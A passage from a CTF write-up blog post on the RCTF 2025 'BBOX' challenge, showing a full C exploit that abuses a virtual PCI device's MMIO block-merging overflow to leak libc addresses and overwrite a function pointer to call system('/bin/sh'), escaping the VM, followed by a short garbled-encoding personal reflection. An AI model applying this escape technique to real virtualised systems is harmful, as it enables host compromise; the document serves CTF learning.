(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len / <span class="number">8</span>; i += <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;  %04x&quot;</span>, i * <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">            i + j &lt; len / <span class="number">8</span> ? <span class="built_in">printf</span>(<span class="string">&quot; 0x%016lx&quot;</span>, buf64[i + j]) : <span class="built_in">printf</span>(<span class="string">&quot;                   &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span> &amp;&amp; j + i * <span class="number">8</span> &lt; len; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">isprint</span>(buf8[i * <span class="number">8</span> + j]) ? buf8[i * <span class="number">8</span> + j] : <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> * mmio_mem;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">mmio_read32</span><span class="params">(<span class="type">uint64_t</span> addr)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">uint32_t</span> *)(mmio_mem + addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write32</span><span class="params">(<span class="type">uint64_t</span> addr, <span class="type">uint32_t</span> val)</span>&#123;</span><br><span class="line">    *(<span class="type">uint32_t</span> *)(mmio_mem + addr) = val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">execute_cmd</span><span class="params">(<span class="type">uint32_t</span> cmd)</span> &#123;</span><br><span class="line">    mmio_write32(VIRTSEC_CMD_REG, cmd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">alloc_block</span><span class="params">(<span class="type">uint32_t</span> id, <span class="type">uint32_t</span> size)</span> &#123;</span><br><span class="line">    mmio_write32(VIRTSEC_BLOCK_SIZE_REG, size);</span><br><span class="line">    mmio_write32(VIRTSEC_BLOCK_ID_REG, id);</span><br><span class="line">    execute_cmd(CMD_ALLOC_BLOCK);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">merge_blocks</span><span class="params">(<span class="type">uint32_t</span> id1, <span class="type">uint32_t</span> id2)</span> &#123;</span><br><span class="line">    mmio_write32(VIRTSEC_MERGE_BLOCK1_ID_REG, id1);</span><br><span class="line">    mmio_write32(VIRTSEC_MERGE_BLOCK2_ID_REG, id2);</span><br><span class="line">    execute_cmd(CMD_MERGE_BLOCKS);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">write_to_block</span><span class="params">(<span class="type">uint32_t</span> id, <span class="type">uint32_t</span> offset, <span class="type">uint32_t</span> value)</span> &#123;</span><br><span class="line">    mmio_write32(VIRTSEC_BLOCK_ID_REG, id);</span><br><span class="line">    mmio_write32(<span class="number">0x1000</span> + offset, value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">read_from_block</span><span class="params">(<span class="type">uint32_t</span> id, <span class="type">uint32_t</span> index)</span>&#123;</span><br><span class="line">    mmio_write32(VIRTSEC_BLOCK_ID_REG, id);</span><br><span class="line">    <span class="keyword">return</span> mmio_read32(<span class="number">0x1000</span> + index);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">dump_block</span><span class="params">(<span class="type">uint32_t</span> id, <span class="type">size_t</span> total_len)</span>&#123;</span><br><span class="line">    <span class="type">uint8_t</span> *buf = <span class="built_in">malloc</span>(total_len);</span><br><span class="line">    <span class="keyword">if</span>(!buf) err_exit(<span class="string">&quot;malloc&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">size_t</span> off=<span class="number">0</span>; off&lt;total_len; off+=<span class="number">4</span>)&#123;</span><br><span class="line">        <span class="type">uint32_t</span> v = read_from_block(id, (<span class="type">uint32_t</span>)off);</span><br><span class="line">        <span class="type">size_t</span> n = total_len - off &gt;= <span class="number">4</span> ? <span class="number">4</span> : total_len - off;</span><br><span class="line">        <span class="built_in">memcpy</span>(buf + off, &amp;v, n);</span><br><span class="line">    &#125;</span><br><span class="line">    binary_dump(<span class="string">&quot;merged_block&quot;</span>, buf, (<span class="type">int</span>)(total_len + <span class="number">0x10</span>));</span><br><span class="line">    <span class="built_in">free</span>(buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">read64_from_block</span><span class="params">(<span class="type">uint32_t</span> id, <span class="type">uint32_t</span> index)</span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> lo = read_from_block(id, index);</span><br><span class="line">    <span class="type">uint32_t</span> hi = read_from_block(id, index + <span class="number">4</span>);</span><br><span class="line">    <span class="keyword">return</span> ((<span class="type">uint64_t</span>)hi &lt;&lt; <span class="number">32</span>) | lo;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">write64_for_block</span><span class="params">(<span class="type">uint32_t</span> id, <span class="type">uint32_t</span> index, <span class="type">uint64_t</span> value)</span>&#123;</span><br><span class="line">    mmio_write32(VIRTSEC_BLOCK_ID_REG, id);</span><br><span class="line">    mmio_write32(<span class="number">0x1000</span> + index, (<span class="type">uint32_t</span>)value);</span><br><span class="line">    mmio_write32(<span class="number">0x1000</span> + index + <span class="number">4</span>, (<span class="type">uint32_t</span>)(value &gt;&gt; <span class="number">32</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">write64_gift_via_merge</span><span class="params">(<span class="type">uint32_t</span> target_id, <span class="type">uint64_t</span> new_func, <span class="type">uint64_t</span> new_str)</span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> tmp = <span class="number">99</span>;</span><br><span class="line">    alloc_block(tmp, <span class="number">16</span>);</span><br><span class="line">    write_to_block(tmp, <span class="number">0</span>, (<span class="type">uint32_t</span>)new_func);</span><br><span class="line">    write_to_block(tmp, <span class="number">4</span>, (<span class="type">uint32_t</span>)(new_func &gt;&gt; <span class="number">32</span>));</span><br><span class="line">    write_to_block(tmp, <span class="number">8</span>, (<span class="type">uint32_t</span>)new_str);</span><br><span class="line">    write_to_block(tmp, <span class="number">12</span>, (<span class="type">uint32_t</span>)(new_str &gt;&gt; <span class="number">32</span>));</span><br><span class="line">    merge_blocks(target_id, tmp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">rebuild_block1_to_256</span><span class="params">()</span>&#123;</span><br><span class="line">    execute_cmd(CMD_RESET);</span><br><span class="line">    execute_cmd(CMD_INIT);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">uint32_t</span> i = <span class="number">1</span>; i &lt;= <span class="number">16</span>; i++) alloc_block(i, <span class="number">16</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">uint32_t</span> i = <span class="number">2</span>; i &lt;= <span class="number">16</span>; i++) merge_blocks(<span class="number">1</span>, i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (iopl(<span class="number">3</span>) !=<span class="number">0</span> )&#123;</span><br><span class="line">        perror(<span class="string">&quot;I/O permission is not enough&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> mmio_fd = open(<span class="string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (mmio_fd == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] failed to open mmio.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x2000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] failed to mmap mmio.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    info(<span class="string">&quot;MMIO memory mapped successfully.&quot;</span>);</span><br><span class="line">    execute_cmd(CMD_INIT);</span><br><span class="line">    info(<span class="string">&quot;Device initialized.&quot;</span>);</span><br><span class="line"></span><br><span class="line">    info(<span class="string">&quot;Allocating 16 blocks of size 16 to fill the buffer...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">uint32_t</span> i = <span class="number">1</span>; i &lt;= <span class="number">16</span>; i++) &#123;</span><br><span class="line">        alloc_block(i, <span class="number">16</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    info(<span class="string">&quot;Buffer filled.&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span>* payload = <span class="string">&quot;THIS_IS_PWNED\n&quot;</span>;</span><br><span class="line">    write_to_block(<span class="number">2</span>, <span class="number">0</span>, ((<span class="type">uint32_t</span>*)payload)[<span class="number">0</span>]);</span><br><span class="line">    write_to_block(<span class="number">2</span>, <span class="number">4</span>, ((<span class="type">uint32_t</span>*)payload)[<span class="number">1</span>]);</span><br><span class="line">    write_to_block(<span class="number">2</span>, <span class="number">8</span>, ((<span class="type">uint32_t</span>*)payload)[<span class="number">2</span>]);</span><br><span class="line">    write_to_block(<span class="number">2</span>, <span class="number">12</span>, ((<span class="type">uint32_t</span>*)payload)[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">    info(<span class="string">&quot;Merging blocks 2 through 16 into block 1...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">uint32_t</span> i = <span class="number">2</span>; i &lt;= <span class="number">16</span>; i++) &#123;</span><br><span class="line">        merge_blocks(<span class="number">1</span>, i);</span><br><span class="line">    &#125;</span><br><span class="line">    info(<span class="string">&quot;Block 1 now has size 256.&quot;</span>);</span><br><span class="line"></span><br><span class="line">    info(<span class="string">&quot;Allocating a new block (ID 17)...&quot;</span>);</span><br><span class="line">    alloc_block(<span class="number">17</span>, <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">    info(<span class="string">&quot;Merging block 1 and 17...&quot;</span>);</span><br><span class="line">    merge_blocks(<span class="number">1</span>, <span class="number">17</span>);</span><br><span class="line">    info(<span class="string">&quot;Block 1 now has size 272.&quot;</span>);</span><br><span class="line"></span><br><span class="line">    info(<span class="string">&quot;Dumping merged block 1 (272 bytes)...&quot;</span>);</span><br><span class="line">    dump_block(<span class="number">1</span>, <span class="number">272</span>);</span><br><span class="line"></span><br><span class="line">    mmio_write32(VIRTSEC_GIFT_REG, <span class="number">1337</span>);</span><br><span class="line">    <span class="type">uint64_t</span> printf_addr = read64_from_block(<span class="number">1</span>, <span class="number">256</span>);</span><br><span class="line">    hexx(<span class="string">&quot;printf_addr&quot;</span>, printf_addr);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> rdi = read64_from_block(<span class="number">1</span>, <span class="number">256</span>+<span class="number">8</span>);</span><br><span class="line">    hexx(<span class="string">&quot;rdi&quot;</span>, rdi);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> libc_base = printf_addr - <span class="number">0x606f0</span>;</span><br><span class="line">    <span class="type">size_t</span> system = libc_base + <span class="number">0x50d70</span>;</span><br><span class="line">    <span class="type">size_t</span> binsh = libc_base + <span class="number">0x1d8678</span>;</span><br><span class="line"></span><br><span class="line">    rebuild_block1_to_256();</span><br><span class="line">    write64_gift_via_merge(<span class="number">1</span>, system, binsh);             </span><br><span class="line">    <span class="type">uint64_t</span> new_func = read64_from_block(<span class="number">1</span>, <span class="number">256</span>);        </span><br><span class="line">    <span class="type">uint64_t</span> new_str  = read64_from_block(<span class="number">1</span>, <span class="number">264</span>);</span><br><span class="line">    hexx(<span class="string">&quot;new_gift_func&quot;</span>, new_func);</span><br><span class="line">    hexx(<span class="string">&quot;new_gift_str&quot;</span>, new_str);</span><br><span class="line"></span><br><span class="line">    mmio_write32(VIRTSEC_GIFT_REG, <span class="number">1337</span>);               </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªé€ƒé€¸æˆåŠŸçš„ç•Œé¢æœ‰ç§è«åå…¶å¦™çš„ç¾ :)  </p>
<img src="/2025/11/18/bbox/3.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  

<h2 id="å†™åˆ°æœ€å"><a href="#å†™åˆ°æœ€å" class="headerlink" title="å†™åˆ°æœ€å"></a>å†™åˆ°æœ€å</h2><p>è¿™å‘¨æœ«çš„å¼ºç½‘æ¯å†³èµ›å°†ä¼šæ˜¯æˆ‘çš„ last dance äº†ï¼Œå›æƒ³æˆ‘åœ¨ CTF å±Šçš„è¿™ä¸¤å¹´åŠç»å†äº†å¾ˆå¤šæŒ«æŠ˜ä¹Ÿå–å¾—äº†å¾ˆå¤šæˆå°±ï¼ˆå®é™…ä¸Šå°±å­¦äº†ä¸€å¹´å¤šä¸€ç‚¹ç‚¹ï¼Œç„¶åå°±ä¸€ç›´åƒè€æœ¬åŸåœ°è¸æ­¥äº†ğŸ¤£ï¼‰ï¼Œä»ä¸€ä¸ªçœ¼é‡Œçœ‹è°éƒ½æ˜¯å¤§ä½¬çš„èŒæ–°åˆ°ç°åœ¨è¿™æ ¹è€æ²¹æ¡ã€‚æˆ‘å‘ç°æˆ‘å¯¹æ¯”èµ›çš„çƒ­æƒ…åœ¨ä¸æ–­çš„æµé€ä¸”å·²ç»æ‰€å‰©æ— å‡ ï¼Œæˆ‘åœ¨èµ›åœºä¸Šæ—¶ä¸å†æœ‰ä»¥å‰é‚£ç§ç‹‚çƒ­æ„Ÿï¼ŒçœŸæƒ³é©¬ä¸Šé€€å½¹ã€‚æ„Ÿè§‰è¿˜æ˜¯æœ‰å¾ˆå¤šé—æ†¾ï¼Œå¯æ˜¯æœ‰é—æ†¾çš„ç»“å±€æ‰æ˜¯ç¾å¥½çš„ :)  </p>
<img src="/2025/11/18/bbox/2.jpg" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  

<p>è¿™æ¬¡æ¯”èµ›ä¹Ÿæœ‰æŒºå¤šæ”¶è·ï¼Œæ¯”å¦‚è®¤è¯†äº†å¥½å‡ ä¸ªæ–°çš„å¸ˆå‚…å¹¶åŠ ä¸Šäº†å¾®ä¿¡æˆ–è€… QQ çš„å¥½å‹ :)  </p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a href="/friend/">Link</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%99%E5%9C%A8%E6%9C%80%E5%89%8D%E9%9D%A2"><span class="toc-number">1.</span> <span class="toc-text">å†™åœ¨æœ€å‰é¢</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">ç¨‹åºåˆ†æ</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">æ¼æ´åˆ†æä¸åˆ©ç”¨</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-number">4.</span> <span class="toc-text">exp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%99%E5%88%B0%E6%9C%80%E5%90%8E"><span class="toc-number">5.</span> <span class="toc-text">å†™åˆ°æœ€å</span></a></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://qanux.github.io/2025/11/18/bbox/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://qanux.github.io/2025/11/18/bbox/&text=RCTF 2025 BBOX"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://qanux.github.io/2025/11/18/bbox/&title=RCTF 2025 BBOX"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://qanux.github.io/2025/11/18/bbox/&is_video=false&description=RCTF 2025 BBOX"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=RCTF 2025 BBOX&body=Check out this article: https://qanux.github.io/2025/11/18/bbox/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://qanux.github.io/2025/11/18/bbox/&title=RCTF 2025 BBOX"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://qanux.github.io/2025/11/18/bbox/&title=RCTF 2025 BBOX"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://qanux.github.io/2025/11/18/bbox/&title=RCTF 2025 BBOX"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://qanux.github.io/2025/11/18/bbox/&title=RCTF 2025 BBOX"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://qanux.github.io/2025/11/18/bbox/&name=RCTF 2025 BBOX&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://qanux.github.io/2025/11/18/bbox/&t=RCTF 2025 BBOX"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2023-2025
    Qanux
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/friend/">Link</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->


 
  <link
    rel="preload"
    href="/lib/font-awesome/css/all.min.css"
    as="style"
    onload="this.onload=null;this.rel='stylesheet'"
  />
  <noscript
    ><link
      rel="stylesheet"
      href="/lib/font-awesome/css/all.min.css"
  /></noscript>


    <!-- jquery -->

  
<script src="/lib/jquery/jquery.min.js"></script>





<!-- clipboard -->

  
    
<script src="/lib/clipboard/clipboard.min.js"></script>

  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
